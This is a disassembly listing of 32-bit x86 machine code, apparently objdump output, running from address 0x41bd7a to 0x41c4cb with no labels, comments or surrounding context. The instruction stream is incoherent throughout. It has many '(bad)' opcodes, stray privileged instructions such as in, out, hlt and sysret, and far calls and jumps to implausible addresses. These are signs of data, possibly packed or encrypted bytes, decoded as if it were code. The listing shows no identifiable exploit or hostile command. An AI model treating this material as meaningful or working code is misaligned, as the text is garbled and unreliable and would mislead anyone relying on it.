  41bd7a:	scas   al,BYTE PTR es:[edi]
  41bd7b:	push   0xa66f61e5
  41bd80:	lods   al,BYTE PTR ds:[esi]
  41bd81:	sub    eax,0x9d07c322
  41bd86:	mov    ds:0x2040b2c7,eax
  41bd8b:	jns    0x41bd0e
  41bd8d:	pop    ebx
  41bd8e:	scas   al,BYTE PTR es:[edi]
  41bd8f:	xchg   esi,eax
  41bd90:	dec    ebx
  41bd91:	dec    ebp
  41bd92:	repz gs mov al,0x5f
  41bd96:	push   0xffffffa9
  41bd98:	jp     0x41bd62
  41bd9a:	(bad)  
  41bd9b:	call   0xf414:0x9be7ec12
  41bda2:	cs mov esi,edi
  41bda5:	sbb    al,ah
  41bda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda8:	ds inc eax
  41bdaa:	or     BYTE PTR [esi-0x1f686e83],cl
  41bdb0:	test   BYTE PTR [ebp+esi*1-0x504baa4f],0x50
  41bdb8:	sub    ch,BYTE PTR [ebx]
  41bdba:	outs   dx,BYTE PTR ds:[esi]
  41bdbb:	loop   0x41bd3e
  41bdbd:	xchg   esi,eax
  41bdbe:	adc    esp,DWORD PTR [edx+0xdb19d2e]
  41bdc4:	push   edi
  41bdc5:	ret    
  41bdc6:	cli    
  41bdc7:	inc    sp
  41bdc9:	sbb    edi,ebp
  41bdcb:	iret   
  41bdcc:	sbb    dl,al
  41bdce:	mov    ds:0xbd5114b7,al
  41bdd3:	mov    al,0xfc
  41bdd5:	xchg   esp,eax
  41bdd6:	outs   dx,DWORD PTR ds:[esi]
  41bdd7:	or     eax,0xdbd2b98d
  41bddc:	mov    dl,ch
  41bdde:	shl    DWORD PTR [eax],0x85
  41bde1:	icebp  
  41bde2:	jo     0x41bdfe
  41bde4:	icebp  
  41bde5:	into   
  41bde6:	or     BYTE PTR [edx+0x1e],0x99
  41bdea:	dec    esp
  41bdeb:	loopne 0x41be58
  41bded:	test   DWORD PTR [eax],0x8c6b66f2
  41bdf3:	jnp    0x41bdeb
  41bdf5:	sub    eax,0x7885aab9
  41bdfa:	hlt    
  41bdfb:	cmp    BYTE PTR [eax],dh
  41bdfd:	enter  0x8d0e,0xc3
  41be01:	mov    bh,0x72
  41be03:	outs   dx,BYTE PTR ds:[esi]
  41be04:	adc    eax,DWORD PTR gs:[ebp+0x7d396f40]
  41be0b:	or     ebx,DWORD PTR [ebx+ebx*1-0x3f]
  41be0f:	loope  0x41bdc6
  41be11:	push   ebp
  41be12:	sub    al,0xe
  41be14:	dec    esi
  41be15:	bnd jl 0x41be2e
  41be18:	jecxz  0x41be27
  41be1a:	test   al,0xba
  41be1c:	jbe    0x41be64
  41be1e:	jp     0x41be52
  41be20:	or     esp,DWORD PTR [edi+edi*1-0x7c221046]
  41be27:	(bad)  
  41be28:	add    esi,edi
  41be2a:	dec    esp
  41be2b:	out    dx,al
  41be2c:	ror    DWORD PTR [edx],cl
  41be2e:	bound  esi,QWORD PTR [edi+ebp*4+0x7e02c7a5]
  41be35:	out    0xfd,eax
  41be37:	xor    ch,BYTE PTR [eax]
  41be39:	out    dx,al
  41be3a:	xchg   edi,eax
  41be3b:	pop    es
  41be3c:	cld    
  41be3d:	mov    bh,0x65
  41be3f:	mov    ebp,0x74497087
  41be44:	retf   
  41be45:	mov    ds:0xda38c5ea,al
  41be4a:	or     al,0x1c
  41be4c:	push   edx
  41be4d:	push   es
  41be4e:	cwde   
  41be4f:	popa   
  41be50:	aas    
  41be51:	leave  
  41be52:	fbstp  TBYTE PTR [ebp-0x5152e4f7]
  41be58:	or     BYTE PTR [ebx],dl
  41be5a:	in     eax,dx
  41be5b:	mov    esi,0x20818c2f
  41be60:	xchg   ebx,ebx
  41be62:	ficomp DWORD PTR [ebp+0x75]
  41be65:	(bad)  
  41be66:	ror    BYTE PTR [ebp-0x5c],1
  41be69:	push   ss
  41be6a:	scas   al,BYTE PTR es:[edi]
  41be6b:	lods   eax,DWORD PTR ds:[esi]
  41be6c:	push   es
  41be6d:	mov    edi,0x13bc083b
  41be72:	lahf   
  41be73:	and    eax,DWORD PTR [bp+di]
  41be76:	adc    ebx,esi
  41be78:	push   0x919d81d8
  41be7d:	cmp    eax,0xafaf2fbc
  41be82:	imul   eax,DWORD PTR ds:0x6ef48459,0xffffffc0
  41be89:	adc    eax,0x10994429
  41be8e:	ss cwde 
  41be90:	push   esi
  41be91:	(bad)  
  41be92:	mov    ecx,esp
  41be94:	pop    ss
  41be95:	push   ecx
  41be96:	push   ecx
  41be97:	out    dx,al
  41be98:	push   ds
  41be99:	arpl   ax,dx
  41be9b:	xchg   edi,eax
  41be9c:	dec    edx
  41be9d:	dec    esp
  41be9e:	jp     0x41be55
  41bea0:	inc    ebx
  41bea1:	ror    BYTE PTR ds:0x25ef8381,cl
  41bea7:	mov    bl,0xc3
  41bea9:	cmp    BYTE PTR [ecx],0x42
  41beac:	sti    
  41bead:	clc    
  41beae:	inc    esi
  41beaf:	sbb    DWORD PTR [eax+0x7a9e1d73],ebp
  41beb5:	jge    0x41bf24
  41beb7:	jle    0x41be41
  41beb9:	jno    0x41bf17
  41bebb:	bound  eax,QWORD PTR [esi+0x22526b45]
  41bec1:	mov    ds:0x792ac9d4,eax
  41bec6:	call   0x99b8a2a0
  41becb:	dec    ebp
  41becc:	pop    esi
  41becd:	push   eax
  41bece:	mov    bl,0x2a
  41bed0:	cmp    al,0xdb
  41bed2:	sbb    ah,BYTE PTR [edx-0x62]
  41bed5:	out    0x35,al
  41bed7:	jns    0x41bf17
  41bed9:	cmp    ah,BYTE PTR [esi-0x72]
  41bedc:	aaa    
  41bedd:	ror    BYTE PTR [edx],cl
  41bedf:	cwde   
  41bee0:	fsub   DWORD PTR [ebx+ebp*8]
  41bee3:	jae    0x41bea8
  41bee5:	adc    BYTE PTR [edi],ah
  41bee7:	inc    ecx
  41bee8:	addr16 adc al,0x26
  41beeb:	jge    0x41bed0
  41beed:	add    BYTE PTR ds:0x3401d95d,cl
  41bef3:	xor    eax,DWORD PTR [edi]
  41bef5:	lahf   
  41bef6:	pop    ecx
  41bef7:	mov    WORD PTR [edi],?
  41bef9:	pop    ecx
  41befa:	test   DWORD PTR [edx+ecx*4-0xf],esp
  41befe:	cs mov eax,0x65e47568
  41bf04:	pop    edx
  41bf05:	jbe    0x41bea9
  41bf07:	xchg   edx,eax
  41bf08:	nop
  41bf09:	sar    DWORD PTR [ecx+ebx*1-0xa42c663],1
  41bf10:	lahf   
  41bf11:	ja     0x41bf22
  41bf13:	and    al,0xca
  41bf15:	stos   DWORD PTR es:[edi],eax
  41bf16:	adc    DWORD PTR [eax+ecx*4-0x7eaaed92],edx
  41bf1d:	xchg   ebx,eax
  41bf1e:	push   eax
  41bf1f:	xchg   esi,eax
  41bf20:	iret   
  41bf21:	push   0xffffffbc
  41bf23:	fs jle 0x41beed
  41bf26:	fwait
  41bf27:	mov    ecx,0x2bf7508a
  41bf2c:	and    BYTE PTR [edx+0x43],dl
  41bf2f:	in     al,0x27
  41bf31:	mov    eax,ds:0xc52b5d2b
  41bf36:	(bad)  
  41bf37:	nop
  41bf38:	shl    BYTE PTR [eax],0x23
  41bf3b:	mov    ?,WORD PTR [ebp+0x43d2da9b]
  41bf41:	jmp    0x1dc361cc
  41bf46:	jbe    0x41bf23
  41bf48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf49:	cmp    eax,0x6e62304b
  41bf4e:	or     eax,0x21e784a7
  41bf53:	sti    
  41bf54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf55:	ss je  0x41bfaf
  41bf58:	push   es
  41bf59:	jo     0x41bfa0
  41bf5b:	mul    DWORD PTR gs:[ebx+0x2d47719f]
  41bf62:	fs retf 0xd555
  41bf66:	adc    edi,DWORD PTR [edi-0x7204abd2]
  41bf6c:	cmp    cl,BYTE PTR [esi+0x33]
  41bf6f:	add    BYTE PTR [ecx+0x7f219a29],dh
  41bf75:	(bad)  [edx]
  41bf77:	pop    ss
  41bf78:	out    dx,al
  41bf79:	fs nop
  41bf7b:	jnp    0x41bfba
  41bf7d:	clc    
  41bf7e:	mov    edi,0x86d09d80
  41bf83:	je     0x41bf42
  41bf85:	retf   0xdd1c
  41bf88:	add    bh,BYTE PTR fs:[ebx+0x1b6e3a9b]
  41bf8f:	push   ebx
  41bf90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf91:	xor    BYTE PTR [ecx-0x42],ah
  41bf94:	push   ds
  41bf95:	jae    0x41bf95
  41bf97:	sbb    DWORD PTR [ebx],edi
  41bf99:	xor    eax,0x3eb99db
  41bf9e:	adc    eax,0x88e6b018
  41bfa3:	repz hlt 
  41bfa5:	fbld   TBYTE PTR [edi]
  41bfa7:	cli    
  41bfa8:	mov    es:0xc3987e54,eax
  41bfae:	retf   0x205f
  41bfb1:	mov    dh,BYTE PTR [esi-0x5e89ad04]
  41bfb7:	or     ah,dh
  41bfb9:	xchg   DWORD PTR [ecx-0x211fdf2a],edi
  41bfbf:	and    esi,DWORD PTR [esi+eax*8-0x9120436]
  41bfc6:	push   0xffffffcb
  41bfc8:	cmp    eax,0x1623e853
  41bfcd:	in     eax,dx
  41bfce:	mov    es,WORD PTR [eax-0x42]
  41bfd1:	scas   al,BYTE PTR es:[edi]
  41bfd2:	scas   eax,DWORD PTR es:[edi]
  41bfd3:	cmc    
  41bfd4:	dec    esi
  41bfd5:	push   esp
  41bfd6:	in     eax,0x90
  41bfd8:	in     eax,dx
  41bfd9:	les    eax,FWORD PTR [ecx]
  41bfdb:	sbb    ecx,esi
  41bfdd:	adc    DWORD PTR [ebp+edi*2+0x7f],ebx
  41bfe1:	jmp    0x41c01d
  41bfe3:	inc    ebp
  41bfe4:	pop    ds
  41bfe5:	ds xchg edi,eax
  41bfe7:	mov    ebp,0x360fb8b7
  41bfec:	in     eax,dx
  41bfed:	fs sbb al,0x23
  41bff0:	fwait
  41bff1:	mov    dl,0x19
  41bff3:	jae    0x41c051
  41bff5:	and    BYTE PTR [esi],0xe1
  41bff8:	sub    eax,0x98b549e7
  41bffd:	push   eax
  41bffe:	sbb    al,0xb5
  41c000:	mov    dh,0x53
  41c002:	aaa    
  41c003:	not    DWORD PTR [edi+esi*1-0x12]
  41c007:	xor    al,0x7a
  41c009:	hlt    
  41c00a:	ja     0x41bfab
  41c00c:	shl    DWORD PTR [edx+0x6c],0x8d
  41c010:	xlat   BYTE PTR ds:[ebx]
  41c011:	pop    ebx
  41c012:	dec    ecx
  41c013:	add    DWORD PTR [edi+0x4eb20194],0xffffffcb
  41c01a:	dec    ebp
  41c01b:	mov    cl,0x5c
  41c01d:	xor    eax,DWORD PTR [ebx-0xc]
  41c020:	fldcw  WORD PTR [ecx-0xa]
  41c023:	jne    0x41bfc0
  41c025:	mov    DWORD PTR [edi+0x6791be44],edx
  41c02b:	push   esi
  41c02c:	imul   ebx,DWORD PTR [ebp-0x3b9cdea2],0xa3650c18
  41c036:	push   edx
  41c037:	cmc    
  41c038:	pop    eax
  41c039:	arpl   WORD PTR [ebx+0x35],sp
  41c03c:	mov    ecx,0x33df608
  41c041:	ins    BYTE PTR es:[edi],dx
  41c042:	shl    DWORD PTR [eax+0x2fb86484],0x8c
  41c049:	nop
  41c04a:	dec    ebp
  41c04b:	test   al,0x13
  41c04d:	mov    ecx,0x74671c0a
  41c052:	jo     0x41c041
  41c054:	ins    BYTE PTR es:[edi],dx
  41c055:	add    edi,0x29
  41c058:	sbb    BYTE PTR [eax-0x2],al
  41c05b:	mov    es,WORD PTR [ecx]
  41c05d:	mov    ebx,DWORD PTR [ebx]
  41c05f:	mov    ds:0x6d8e113f,eax
  41c064:	xchg   edi,eax
  41c065:	and    BYTE PTR [ebp-0x271f6670],dh
  41c06b:	sbb    DWORD PTR [ebp+eax*1-0x721bcd33],esi
  41c072:	xor    eax,0x14665c35
  41c077:	pop    eax
  41c078:	cmp    BYTE PTR [eax],bh
  41c07a:	inc    eax
  41c07b:	xor    BYTE PTR [esi+ecx*1-0x3edd5b13],ah
  41c082:	mov    ecx,0x70dfaa3a
  41c087:	add    eax,0xc8165fbe
  41c08c:	pop    edx
  41c08d:	inc    ecx
  41c08e:	lods   eax,DWORD PTR ds:[esi]
  41c08f:	rcr    DWORD PTR [ebx+0x60],0x56
  41c093:	mov    bh,0x94
  41c095:	mov    edx,0xeb9e7001
  41c09a:	add    eax,0xa7a5b3f8
  41c09f:	outs   dx,BYTE PTR ds:[esi]
  41c0a0:	mov    esi,0xa44ca473
  41c0a5:	dec    ecx
  41c0a6:	mov    ch,cl
  41c0a8:	mov    ds:0xa46adcb3,al
  41c0ad:	je     0x41c129
  41c0af:	int    0x68
  41c0b1:	in     al,0x35
  41c0b3:	add    dh,BYTE PTR [ecx+0x31]
  41c0b6:	lea    ebx,[esi]
  41c0b8:	pop    esi
  41c0b9:	jae    0x41c053
  41c0bb:	loope  0x41c084
  41c0bd:	in     eax,dx
  41c0be:	xor    dh,BYTE PTR [ecx]
  41c0c0:	add    BYTE PTR [ebx+0xe],bh
  41c0c3:	test   BYTE PTR [ebp+0x1b],bh
  41c0c6:	nop
  41c0c7:	xchg   edx,eax
  41c0c8:	fucomp st(2)
  41c0ca:	scas   al,BYTE PTR es:[edi]
  41c0cb:	sbb    esi,DWORD PTR [edx-0x66b5bc98]
  41c0d1:	and    eax,0xffffffec
  41c0d4:	sbb    dh,BYTE PTR [eax+0x5457624c]
  41c0da:	rcr    BYTE PTR [esi+eiz*1+0x23],0x75
  41c0df:	dec    edx
  41c0e0:	out    dx,al
  41c0e1:	cdq    
  41c0e2:	jmp    0x41c121
  41c0e4:	jb     0x41c0ee
  41c0e6:	repnz ds or dl,cl
  41c0ea:	js     0x41c0e0
  41c0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0ed:	aad    0x4c
  41c0ef:	ret    0x4dc7
  41c0f2:	shr    BYTE PTR [eax-0x48a2c787],1
  41c0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0f9:	lods   eax,DWORD PTR ds:[esi]
  41c0fa:	sub    eax,0x9c8fa5db
  41c0ff:	add    eax,0x842bfd4c
  41c104:	loop   0x41c0ab
  41c106:	(bad)  
  41c107:	(bad)  
  41c108:	sti    
  41c109:	pusha  
  41c10a:	dec    edi
  41c10b:	cmp    DWORD PTR [ecx+0x26e5e313],eax
  41c111:	leave  
  41c112:	sbb    cl,dh
  41c114:	cdq    
  41c115:	cld    
  41c116:	sbb    esp,DWORD PTR [ebx]
  41c118:	mov    dh,0xad
  41c11a:	ss ins DWORD PTR es:[edi],dx
  41c11c:	mov    ebx,0x1d41689e
  41c121:	pop    eax
  41c122:	push   0x9738843e
  41c127:	dec    esi
  41c128:	add    bl,BYTE PTR [eax]
  41c12a:	call   0xa144719
  41c12f:	push   0x47
  41c131:	xchg   ecx,eax
  41c132:	imul   ecx,DWORD PTR [ecx],0x76
  41c135:	inc    ecx
  41c136:	cs dec ecx
  41c138:	sbb    esp,DWORD PTR [edi]
  41c13a:	lea    ebx,[edx]
  41c13c:	sbb    al,0x2e
  41c13e:	cmp    al,0x49
  41c140:	inc    edi
  41c141:	push   edi
  41c142:	add    ebp,ebx
  41c144:	mov    BYTE PTR [ebx-0x44],dl
  41c147:	dec    esp
  41c148:	lods   al,BYTE PTR ds:[esi]
  41c149:	shl    DWORD PTR [esi],cl
  41c14b:	arpl   WORD PTR [ebx],bx
  41c14d:	push   0xffffff84
  41c14f:	cmp    edx,ebx
  41c151:	mov    bl,0xc
  41c153:	xor    edi,DWORD PTR [esi]
  41c155:	dec    esp
  41c156:	push   es
  41c157:	repnz xor BYTE PTR ds:0x8ad9fd34,0x78
  41c15f:	cmp    al,0x72
  41c161:	mov    dl,0x48
  41c163:	nop
  41c164:	jno    0x41c1ce
  41c166:	ja     0x41c1b7
  41c168:	xor    al,0x1c
  41c16a:	stos   BYTE PTR es:[edi],al
  41c16b:	push   cs
  41c16c:	jmp    0x41c0f5
  41c16e:	sahf   
  41c16f:	mov    ebp,0x81b94873
  41c174:	cs or  ch,al
  41c177:	jno    0x41c10c
  41c179:	ret    
  41c17a:	mov    bh,bh
  41c17c:	dec    ecx
  41c17d:	jmp    0x50973d94
  41c182:	pop    edx
  41c183:	mov    ds:0x183a89b1,eax
  41c188:	out    0x2c,eax
  41c18a:	mov    ah,0xa
  41c18c:	sbb    eax,DWORD PTR [ecx-0x624cc8a6]
  41c192:	imul   edx,DWORD PTR [eax-0x1f],0xffffffdf
  41c196:	push   esp
  41c197:	test   DWORD PTR [edi-0x436f4157],esp
  41c19d:	xor    al,0xd0
  41c19f:	repz sti 
  41c1a1:	xor    cl,BYTE PTR [ebp+0x7065c1e9]
  41c1a7:	xchg   esp,eax
  41c1a8:	sbb    al,0x84
  41c1aa:	lock loopne 0x41c1fb
  41c1ad:	rcl    bh,cl
  41c1af:	enter  0x4c6e,0x7f
  41c1b3:	out    0xf8,eax
  41c1b5:	(bad)  
  41c1b6:	pushf  
  41c1b7:	jmp    0xc5d7:0x35271752
  41c1be:	stc    
  41c1bf:	adc    ah,BYTE PTR [esi]
  41c1c1:	retf   0x31ff
  41c1c4:	cmp    DWORD PTR ds:0x379e2188,edi
  41c1ca:	aas    
  41c1cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1cc:	inc    ebx
  41c1cd:	mov    ebp,0x660f4bf2
  41c1d2:	dec    esi
  41c1d3:	mov    esi,0x54f79e94
  41c1d8:	rcl    BYTE PTR [ebx+edx*8],cl
  41c1db:	cmc    
  41c1dc:	loop   0x41c1b8
  41c1de:	out    0x95,ax
  41c1e1:	sar    DWORD PTR [eax],cl
  41c1e3:	sbb    ch,BYTE PTR [eax]
  41c1e5:	mov    BYTE PTR [edx+0x17],dh
  41c1e8:	repz cmp dl,bl
  41c1eb:	hlt    
  41c1ec:	std    
  41c1ed:	mov    BYTE PTR [esi-0x5002584a],al
  41c1f3:	push   0xe02ae874
  41c1f8:	retf   0x5c0e
  41c1fb:	mov    bl,0x6f
  41c1fd:	in     eax,dx
  41c1fe:	aaa    
  41c1ff:	xchg   ebp,eax
  41c200:	and    DWORD PTR [ecx],edi
  41c202:	imul   BYTE PTR [esi-0x5d]
  41c205:	sub    al,0x25
  41c207:	xchg   BYTE PTR [eax],dl
  41c209:	ins    DWORD PTR es:[edi],dx
  41c20a:	cli    
  41c20b:	mov    al,ds:0xa147eac2
  41c210:	pop    ss
  41c211:	inc    esp
  41c212:	clc    
  41c213:	fwait
  41c214:	adc    DWORD PTR [ebx+eax*1+0x63],ecx
  41c218:	sbb    BYTE PTR [ecx-0x39],dl
  41c21b:	jns    0x41c20f
  41c21d:	cmp    eax,0x77455a3c
  41c222:	neg    BYTE PTR ds:0x93690a48
  41c228:	(bad)  ds:0xace7492f
  41c22e:	mov    WORD PTR [ebp+0xa],gs
  41c231:	cwde   
  41c232:	jmp    0x41c296
  41c234:	jle    0x41c21a
  41c236:	xchg   edi,eax
  41c237:	sub    edi,DWORD PTR [esi-0x624b0b9a]
  41c23d:	clc    
  41c23e:	push   esi
  41c23f:	dec    eax
  41c240:	or     BYTE PTR [eax+0x38],ch
  41c243:	mov    esp,0xce85bfb7
  41c248:	dec    ebx
  41c249:	shl    DWORD PTR [edi-0x1a],1
  41c24c:	adc    al,0x6a
  41c24e:	dec    ebx
  41c24f:	and    eax,0xeb3b21e
  41c254:	ins    BYTE PTR es:[edi],dx
  41c255:	dec    edi
  41c256:	shl    DWORD PTR [ecx-0x66],0x3a
  41c25a:	imul   ecx,DWORD PTR [ebp+eax*2+0x5dafaf8f],0x4ce5860c
  41c265:	mov    ch,0x84
  41c267:	adc    BYTE PTR [ecx+0x2d],bl
  41c26a:	dec    ecx
  41c26b:	inc    ebp
  41c26c:	das    
  41c26d:	sti    
  41c26e:	mov    DWORD PTR [ebx+0x36feb34a],eax
  41c274:	or     DWORD PTR [eax],0x5c2fc430
  41c27a:	sub    ebx,esi
  41c27c:	xchg   edi,eax
  41c27d:	jmp    0x41c29f
  41c27f:	pop    ss
  41c280:	fsub   DWORD PTR [esi]
  41c282:	lds    eax,FWORD PTR [ecx+0x1b]
  41c285:	sahf   
  41c286:	adc    eax,0xd8b99484
  41c28b:	(bad)  
  41c28d:	fisubr WORD PTR [edi]
  41c28f:	test   edx,edx
  41c291:	jnp    0x41c2ae
  41c293:	adc    DWORD PTR [ebp+0x2d83d358],esp
  41c299:	dec    DWORD PTR [edx-0x76]
  41c29c:	cmp    DWORD PTR [edx-0x16aca778],ebx
  41c2a2:	addr16 pop edi
  41c2a4:	dec    eax
  41c2a5:	out    dx,eax
  41c2a6:	gs dec edi
  41c2a8:	xlat   BYTE PTR ds:[ebx]
  41c2a9:	xchg   edx,eax
  41c2aa:	pop    eax
  41c2ab:	xchg   edi,eax
  41c2ac:	inc    ecx
  41c2ad:	fxam   
  41c2af:	jb     0x41c323
  41c2b1:	imul   ecx,DWORD PTR [ebx+0x63],0xffffffb2
  41c2b5:	sti    
  41c2b6:	shl    ch,1
  41c2b8:	js     0x41c260
  41c2ba:	sbb    al,0x95
  41c2bc:	je     0x41c323
  41c2be:	sub    BYTE PTR [edx-0x2d6e44ec],0x27
  41c2c5:	fwait
  41c2c6:	push   edi
  41c2c7:	and    ch,ah
  41c2c9:	std    
  41c2ca:	push   eax
  41c2cb:	std    
  41c2cc:	jecxz  0x41c256
  41c2ce:	mov    dl,0xac
  41c2d0:	dec    edx
  41c2d1:	inc    ebx
  41c2d2:	mov    cl,0xde
  41c2d4:	dec    edx
  41c2d5:	mov    bh,0x69
  41c2d7:	imul   eax,DWORD PTR [ebp-0x2d],0x1f
  41c2db:	test   BYTE PTR [ebp-0x2e3dd382],al
  41c2e1:	xchg   ebx,eax
  41c2e2:	cld    
  41c2e3:	ror    cl,cl
  41c2e5:	daa    
  41c2e6:	jae    0x41c2df
  41c2e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2e9:	mov    esp,ss
  41c2eb:	pop    esp
  41c2ec:	ins    DWORD PTR es:[edi],dx
  41c2ed:	(bad)  
  41c2ee:	pop    ebp
  41c2ef:	xor    al,bh
  41c2f1:	sub    edi,DWORD PTR [ecx-0x431e4c14]
  41c2f7:	pop    es
  41c2f8:	mov    ah,0x68
  41c2fa:	test   eax,0x43c2fa13
  41c2ff:	xor    DWORD PTR [eax],ebp
  41c301:	fsubr  st,st(4)
  41c303:	shl    ch,cl
  41c305:	sub    al,0x3
  41c307:	pop    esi
  41c308:	(bad)  
  41c309:	lahf   
  41c30a:	test   DWORD PTR [eax+edx*4],eax
  41c30d:	imul   esi,DWORD PTR [edi],0xffffffe8
  41c310:	mov    ch,0x47
  41c312:	xchg   DWORD PTR cs:[esp+edi*8],ebx
  41c316:	int    0x3b
  41c318:	fbstp  TBYTE PTR [ebp+0x49]
  41c31b:	xchg   edi,eax
  41c31c:	call   0xdafee9d5
  41c321:	aam    0x38
  41c323:	call   0x86708898
  41c328:	stos   BYTE PTR es:[edi],al
  41c329:	test   al,0xb2
  41c32b:	push   es
  41c32c:	ins    DWORD PTR es:[edi],dx
  41c32d:	mov    esi,es
  41c32f:	adc    al,0x3c
  41c331:	xchg   ecx,eax
  41c332:	inc    edx
  41c333:	into   
  41c334:	dec    edi
  41c335:	cmp    eax,0xcd94c45a
  41c33a:	pop    ebx
  41c33b:	pop    ds
  41c33c:	mov    al,ds:0xaeeea1fe
  41c341:	je     0x41c38f
  41c343:	mov    esp,0x7fd226d8
  41c348:	(bad)  
  41c349:	ret    0xed9d
  41c34c:	jae    0x41c30c
  41c34e:	call   0xe8:0x722fe404
  41c355:	test   DWORD PTR [ebx+0x39612348],0xcc114d00
  41c35f:	mov    ebp,0x3ea89641
  41c364:	test   al,0x8a
  41c366:	or     al,0x31
  41c368:	call   FWORD PTR [esi+0x6c]
  41c36b:	mov    dh,BYTE PTR [esi-0x31f23fce]
  41c371:	jg     0x41c3c9
  41c373:	mov    ds,WORD PTR [esi+0x11aafeeb]
  41c379:	add    al,0x8c
  41c37b:	or     BYTE PTR ds:0x361c7a62,0x9
  41c382:	ja     0x41c385
  41c384:	or     esp,DWORD PTR [edi]
  41c386:	scas   eax,DWORD PTR es:[edi]
  41c387:	sbb    ebp,DWORD PTR [esi+eax*2]
  41c38a:	in     al,0x8e
  41c38c:	cwde   
  41c38d:	lods   eax,DWORD PTR ds:[esi]
  41c38e:	shr    DWORD PTR [ecx-0x66],0x35
  41c392:	mov    edx,0x21ca0f44
  41c397:	xor    ah,BYTE PTR [esi-0x43f2ac33]
  41c39d:	push   es
  41c39e:	lahf   
  41c39f:	xor    al,0x26
  41c3a1:	in     eax,dx
  41c3a2:	lods   eax,DWORD PTR ds:[esi]
  41c3a3:	outs   dx,BYTE PTR ds:[esi]
  41c3a4:	fisub  WORD PTR [ecx]
  41c3a6:	loopne 0x41c3fb
  41c3a8:	pop    edi
  41c3a9:	call   0x6349:0x9ee1e1c4
  41c3b0:	ss addr16 pop edx
  41c3b3:	jne    0x41c407
  41c3b5:	faddp  st(7),st
  41c3b7:	jg     0x41c346
  41c3b9:	nop
  41c3ba:	in     al,dx
  41c3bb:	sahf   
  41c3bc:	mov    bh,0x89
  41c3be:	mov    bl,0xf3
  41c3c0:	in     al,dx
  41c3c1:	les    edi,FWORD PTR [eax]
  41c3c3:	ret    
  41c3c4:	mov    ebp,0x3efb5f6a
  41c3c9:	add    eax,0x6c2261b8
  41c3ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3cf:	xlat   BYTE PTR ds:[ebx]
  41c3d0:	shl    BYTE PTR [ebx-0x2b],0xa9
  41c3d4:	out    dx,eax
  41c3d5:	xor    ch,BYTE PTR [ecx+0x5890e678]
  41c3db:	sbb    al,0xca
  41c3dd:	test   al,0x85
  41c3df:	sbb    edi,DWORD PTR [ecx+0xa00a98c]
  41c3e5:	dec    ebp
  41c3e6:	(bad)  
  41c3e8:	in     eax,dx
  41c3e9:	sysret 
  41c3eb:	mov    edi,edx
  41c3ed:	inc    edx
  41c3ee:	pop    eax
  41c3ef:	in     eax,dx
  41c3f0:	mov    cs,WORD PTR [edi]
  41c3f2:	out    0x13,eax
  41c3f4:	dec    eax
  41c3f5:	inc    ecx
  41c3f6:	sub    al,0xb7
  41c3f8:	cmp    DWORD PTR ds:0xf4313d44,edx
  41c3fe:	rol    BYTE PTR [ecx+0x7],0xa6
  41c402:	push   cs
  41c403:	and    edx,DWORD PTR [ebx-0x67]
  41c406:	cli    
  41c407:	lods   al,BYTE PTR ds:[esi]
  41c408:	repnz mov ebx,DWORD PTR [eax-0x718514a8]
  41c40f:	and    al,0xe8
  41c411:	in     eax,dx
  41c412:	mov    eax,0xdc73f5c
  41c417:	mov    bl,0x4
  41c419:	xchg   ebx,eax
  41c41a:	dec    esi
  41c41b:	loop   0x41c405
  41c41d:	or     al,bl
  41c41f:	imul   esi,DWORD PTR [esi+0x5d],0x9c1b4464
  41c426:	js     0x41c43f
  41c428:	iret   
  41c429:	add    bh,BYTE PTR [esi+edx*8-0x6b]
  41c42d:	stos   BYTE PTR es:[edi],al
  41c42e:	xor    edx,DWORD PTR [ebx-0x10]
  41c431:	cmp    DWORD PTR [eax],esi
  41c433:	ss (bad) 
  41c435:	call   0x3ee7f16f
  41c43a:	xchg   ebp,eax
  41c43b:	jge    0x41c401
  41c43d:	icebp  
  41c43e:	fwait
  41c43f:	js     0x41c41a
  41c441:	or     al,0xf7
  41c443:	dec    eax
  41c444:	(bad)  
  41c445:	in     eax,dx
  41c446:	cs cwde 
  41c448:	(bad)  
  41c44a:	cmc    
  41c44b:	xchg   ecx,eax
  41c44c:	mov    edx,0x4a69fb25
  41c451:	mov    dh,BYTE PTR [ebp-0x3f]
  41c454:	inc    ecx
  41c455:	les    edx,FWORD PTR [edi-0x5c]
  41c458:	fiadd  DWORD PTR [ecx+0x4bae9113]
  41c45e:	dec    esi
  41c45f:	mov    DWORD PTR [ecx],esp
  41c461:	mov    bh,0x8e
  41c463:	mov    ecx,0xb0e71cf6
  41c468:	push   edi
  41c469:	add    al,0x8b
  41c46b:	dec    ecx
  41c46c:	inc    ebx
  41c46d:	and    dh,0xb1
  41c470:	mov    ds:0x7afededb,al
  41c475:	jb     0x41c40d
  41c477:	add    ebx,ebp
  41c479:	xchg   DWORD PTR [edx-0x7b],edx
  41c47c:	scas   eax,DWORD PTR es:[edi]
  41c47d:	fidivr WORD PTR [ecx-0x12]
  41c480:	mov    eax,0xbf375404
  41c485:	sbb    edx,DWORD PTR [eax-0x4276cca7]
  41c48b:	pushf  
  41c48c:	inc    ebp
  41c48d:	out    dx,al
  41c48e:	adc    eax,0x7233f62
  41c493:	scas   ax,WORD PTR es:[edi]
  41c495:	dec    ebp
  41c496:	repz xor DWORD PTR [ebx-0x3e],eax
  41c49a:	xchg   ebx,eax
  41c49b:	stos   DWORD PTR es:[edi],eax
  41c49c:	sbb    BYTE PTR [ebx],bh
  41c49e:	sbb    ah,bl
  41c4a0:	xchg   ebp,eax
  41c4a1:	dec    eax
  41c4a2:	div    DWORD PTR [eax+0x489f80e7]
  41c4a8:	sub    eax,0x7595db76
  41c4ad:	fistp  WORD PTR [eax+edx*1+0x17]
  41c4b1:	repnz and al,0x64
  41c4b4:	mov    esi,0xb0d78b17
  41c4b9:	jns    0x41c499
  41c4bb:	arpl   WORD PTR [edi],sp
  41c4bd:	arpl   di,ax
  41c4bf:	je     0x41c52d
  41c4c1:	jp     0x41c496
  41c4c3:	test   dl,dl
  41c4c5:	xor    DWORD PTR [edx],esi
  41c4c7:	jl     0x41c4c6
  41c4c9:	cmp    edx,ecx
  41c4cb:	or     al,0x2d
